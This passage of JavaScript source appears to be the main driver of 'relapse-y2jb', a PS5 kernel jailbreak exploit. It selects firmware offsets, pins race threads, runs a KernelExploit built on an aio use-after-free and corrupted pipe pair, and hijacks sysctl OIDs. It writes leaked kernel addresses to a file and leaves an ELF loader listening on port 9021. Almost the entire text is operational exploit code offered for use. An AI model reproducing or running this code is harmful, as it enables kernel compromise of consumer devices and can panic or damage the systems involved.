        function scan_crash_artifacts() {
            const dirs = ["/user/temp", "/user/temp/common_temp", "/user/common",
                "/user/crash", "/user/swap", "/user/shell", "/mnt/auto",
                "/var", "/var/db", "/var/log", "/var/crash"];
            const interesting = /crash|dump|core|panic|kdump|report|assert|err|\.log/i;
            const now_s = Math.floor(Date.now() / 1000);
            say("crash-artifact scan (wall clock " + now_s + " = 0x" +
                now_s.toString(16) + "; a bogus clock just means the timestamp " +
                "filter is useless, the listings still are not)");
            for (const dir of dirs) {
                let names = null;
                try { names = list_dir(dir, 256); } catch (_) { names = null; }
                if (!names) { say("  " + dir + ": not readable"); continue; }
                say("  " + dir + ": " + names.length + " entries - " +
                    names.slice(0, 40).join(", ") + (names.length > 40 ? ", ..." : ""));
                for (const name of names) {
                    if (name === "." || name === "..") continue;
                    let st = null;
                    try { st = stat_words(dir + "/" + name); } catch (_) { st = null; }
                    if (!st) continue;
                    let recent = false;
                    for (const w of st) {
                        const v = Number(w & MASK64);
                        if (v > now_s - 86400 && v < now_s + 3600) { recent = true; break; }
                    }
                    if (!recent && !interesting.test(name)) continue;
                    say("    " + dir + "/" + name +
                        (recent ? "  <-- modified within a day" : "") + "\n      " +
                        st.map((w, i) => "+" + (i * 8).toString(16) + "=0x" +
                            (w & MASK64).toString(16)).join(" "));
                }
            }
        }
        capture_log_socket();
        if (net_log_init())
            log_now("network log: every line also goes to " + net_log_target +
                " (tools/log_listener.py)");
        else if (NET_LOG !== "off")
            log_now("network log disabled: " +
                (net_log_error || net_log_reason || "unknown reason") +
                ". Without UDP the only transcript is the loader's TCP stream, " +
                "which reorders and loses lines when the console dies");
        send_notification(relapse_version + "\nFW " + FW_VERSION + "\n" +
            (typeof version_string === "string" ? version_string : "Y2JB"));
        say("relapse-y2jb starting");
        if (typeof is_jailbroken === "function" && is_jailbroken()) {
            send_notification("relapse: already jailbroken");
            say("already jailbroken - nothing to do");
            return;
        }
        if (!ALLOW_AFTER_P2JB) {
            const p2jb_markers = ["/user/temp/common_temp/p2jb.fail"];
            try {
                p2jb_markers.unshift("/" + get_nidpath() + "/common_temp/p2jb.fail");
            } catch (_) { }
            const hit = p2jb_markers.filter((m) => {
                try { return file_exists(m); } catch (_) { return false; }
            });
            if (hit.length)
                fatal("p2jb already ran this boot (" + hit[0] + ") but this " +
                    "process is not jailbroken - reboot the PS5 instead of " +
                    "racing the aio UAF on top of p2jb's kernel state " +
                    "(or set ALLOW_AFTER_P2JB = true)");
        }
        if (typeof read_file !== "function")
            fatal("read_file is not in scope - the kexp/elfldr delivery reads " +
                "them from the Y2JB sandbox slot");
        if (typeof Thrd_create === "undefined" || typeof Thrd_join === "undefined")
            fatal("Thrd_create/Thrd_join are not in scope (Y2JB framework too old?)");
        const fw = String(FW_VERSION);
        const picked = pick_offsets(fw);
        const off = picked.off;
        if (!off)
            fatal("FW " + fw + " has no Relapse offset table. Bundled: " +
                (picked.hint.length ? picked.hint.join(", ") +
                    " (this major version)" : picked.known.join(", ")));
        log_now("FW " + fw + " offsets loaded (allproc rva " +
            toHex(BigInt(off.allproc)) + ", aio uaf)");
        const marker_paths = ["/user/temp/common_temp/" + FAIL_MARKER_NAME];
        try {
            marker_paths.unshift("/" + get_nidpath() + "/common_temp/" + FAIL_MARKER_NAME);
        } catch (_) { }
        let failcheck_path = null;
        try {
            const present = marker_paths.filter((m) => {
                try { return file_exists(m); } catch (_) { return false; }
            });
            if (present.length && IGNORE_FAIL_MARKER) {
                log_now("fail marker present (" + present[0] +
                    ") but IGNORE_FAIL_MARKER is set - continuing anyway");
            } else if (present.length) {
                send_notification("relapse already ran this boot\nreboot the PS5 first");
                say("fail marker present (" + present[0] + ") - reboot before retrying");
                return;
            }
        } catch (_) { }
        const chain = new Y2Chain(p);
        await probe_worker_chain(chain);
        const exploit = new KernelExploit(p, chain, say, off);
        const upstreamPin = exploit.pinToSingleCore.bind(exploit);
        exploit.pinToSingleCore = async function () {
            await upstreamPin();
            if (this.pinnedCore === undefined || this.pinnedCore < 0) return;
            let core = this.pinnedCore;
            if (WORKER_CORE === "other") {
                const mask = (this.allowedMask >>> 0) || 0;
                for (let c = 0; c < 16; c++)
                    if ((mask & (1 << c)) && c !== this.pinnedCore) { core = c; break; }
            }
            if (WORKER_CORE === null) {
                say("main thread pinned to core " + this.pinnedCore +
                    ", race worker left floating");
                return;
            }
            chain.setWorkerAffinity(core, 2 /* PRI_REALTIME */);
            say("race pinned: main core " + this.pinnedCore + ", worker core " + core);
        };
        for (const m of marker_paths) {
            try {
                write_file(m, "");
                if (file_exists(m)) { failcheck_path = m; break; }
            } catch (_) { }
        }
        if (!failcheck_path) say("could not write a one-run-per-boot marker (" +
            marker_paths.join(", ") + ") - continuing without that safety net");
        let result = null;
        let threw = null;
        if (STOP_AFTER === "chain") {
            say("STOP_AFTER=chain - the worker chain ran its self-test and nothing " +
                "else; the exploit never started and no kernel state was touched");
        } else try {
            result = await exploit.run();
        } catch (e) {
            threw = e;
        }
        if (CLOSE_PIPES_AFTER_RUN) {
            say("closing the 4 pipe fds now - if the console dies here, freeing an " +
                "armed pipe buffer is what kills it");
            const targets = [];
            for (const [name, pp] of [["master", exploit.master], ["victim", exploit.victim]])
                if (pp) targets.push([name + ".r", pp.readFd], [name + ".w", pp.writeFd]);
            const results = [];
            for (const [name, fd] of targets) {
                say("close(" + name + " fd " + fd + ") ...");
                let rv;
                try { rv = await exploit.sysInt(SYS_CLOSE, fd); }
                catch (e) { rv = "threw " + ((e && e.message) || e); }
                results.push(name + " " + fd + " -> " + rv);
                say("close(" + name + " fd " + fd + ") -> " + rv);
            }
            say("close() summary: " + results.join(" | ") + "  (0 = closed)");
        }
        if (!result || !result.payloads) {
            if (!threw && failcheck_path) {
                try {
                    syscall(SYSCALL.unlink, alloc_string(failcheck_path));
                    say("fail marker cleared - safe to retry");
                } catch (_) { }
            }
            if (threw) {
                say("exception: " + (threw.message || threw));
                send_notification("relapse FAILED\n" + (threw.message || threw));
            } else {
                send_notification("relapse stopped\n(see log)");
            }
            return;
        }
        try {
            globalThis.relapse_status = function () {
                return {
                    kbase: exploit.kbase ? exploit.kbase.toString() : null,
                    crossed: !!exploit.crossed,
                    disarmed: !!exploit.disarmed,
                    oidsRestored: !!exploit.oidsRestored,
                    handedOff: !!exploit.handedOff,
                    master: exploit.master ? [exploit.master.readFd, exploit.master.writeFd] : null,
                    victim: exploit.victim ? [exploit.victim.readFd, exploit.victim.writeFd] : null,
                };
            };
        } catch (e) {
            log_now("could not install the status hook: " + e.message);
        }
        if (PIPE_NOTE_FOR_CLEANER && exploit.master && exploit.victim) {
            try {
                const pp = exploit.off.pipe;
                const hex = (v) => "0x" + (v === undefined ? "e8" : v.toString(16));
                const logip = net_log_target ? net_log_target.split(":")[0] : "";
                const note = "logip=" + logip + "\n" +
                    "pid=" + Number(syscall(SYSCALL.getpid)) + "\n" +
                    "master=0x" + exploit.master.pipe.toString() + "\n" +
                    "victim=0x" + exploit.victim.pipe.toString() + "\n" +
                    "reference=0x" + (exploit.refPipe ? exploit.refPipe.toString() : "0") + "\n" +
                    "kbase=0x" + (exploit.kbase ? exploit.kbase.toString() : "0") + "\n" +
                    "allproc=0x" + exploit.kaddr(exploit.off.allproc).toString() + "\n" +
                    "master_buf=0x" + (exploit.savedBuffers && exploit.savedBuffers.master ? exploit.savedBuffers.master.toString() : "0") + "\n" +
                    "victim_buf=0x" + (exploit.savedBuffers && exploit.savedBuffers.victim ? exploit.savedBuffers.victim.toString() : "0") + "\n" +
                    "pipe_size=" + (exploit.savedBuffers ? exploit.savedBuffers.masterSize : 0) + "\n" +
                    "off_buffer=" + hex(pp.buffer) + "\n" +
                    "off_count=" + hex(pp.count) + "\n" +
                    "off_in=" + hex(pp.in) + "\n" +
                    "off_out=" + hex(pp.out) + "\n" +
                    "off_size=" + hex(pp.size) + "\n" +
                    "off_pair=" + hex(pp.pair) + "\n";
                const dirs = ["/user/temp/common_temp"];
                try { dirs.unshift("/" + get_nidpath() + "/common_temp"); } catch (_) { }
                let wrote = 0;
                for (const d of dirs) {
                    try {
                        write_file(d + "/relapse-pipes.txt", note);
                        wrote++;
                        say("pipe note written to " + d + "/relapse-pipes.txt");
                    } catch (e) {
                        say("pipe note not written to " + d + ": " + e.message);
                    }
                }
                if (wrote) say("pipe note: " + note.replace(/\n/g, " ") +
                    "  <- send pipeclean.elf to :9021 to seal the pipes, then close the app");
                else say("PIPE_NOTE_FOR_CLEANER: no writable directory for the note");
            } catch (e) {
                say("pipe note failed: " + e.message);
            }
        }
        if (CRASH_ARTIFACT_SCAN) {
            try { scan_crash_artifacts(); }
            catch (e) { say("crash-artifact scan threw " + e.message); }
        }
        log_now("=== relapse complete ===");
        log_now("elfldr listening on :9021" + (exploit.crossed
            ? " - the crossed pair is STILL ARMED: send the pipeclean seal ELF to " +
            ":9021 BEFORE closing the app, closing while armed panics the console"
            : " - both pipes hold their own buffers again, the app is safe to close" +
            (exploit.oidsRestored ? "" :
                "; the sysctl OIDs are still hijacked, so kern.smp.cpus reads a " +
                "kernel address instead of the CPU count until the next reboot") +
            " (eboot segments restored)"));
        send_notification("relapse complete\nelfldr on <ps5-ip>:9021");
        if (EXIT_TEST === "sigkill" || EXIT_TEST === "exit") {
            const pid = syscall(SYSCALL.getpid);
            say("EXIT_TEST=" + EXIT_TEST + ": ending this process (pid " + pid +
                ") in 2s - if the console survives, the panic belongs to the " +
                "graceful close path and not to the aio residue");
            await sleep(2000);
            if (EXIT_TEST === "sigkill") syscall(SYSCALL.kill, pid, 9n);
            else syscall(1n /* SYS_exit */, 0n);
            say("EXIT_TEST: the process is still here - the exit call returned " +
                "(kill " + EXIT_TEST + " did not take effect)");
        }
    } catch (e) {
        try { log_now("FATAL: " + e.message); } catch (_) { }
        try { send_notification("relapse FAILED: " + e.message); } catch (_) { }
    } finally {
        restore_log_socket();
    }
})();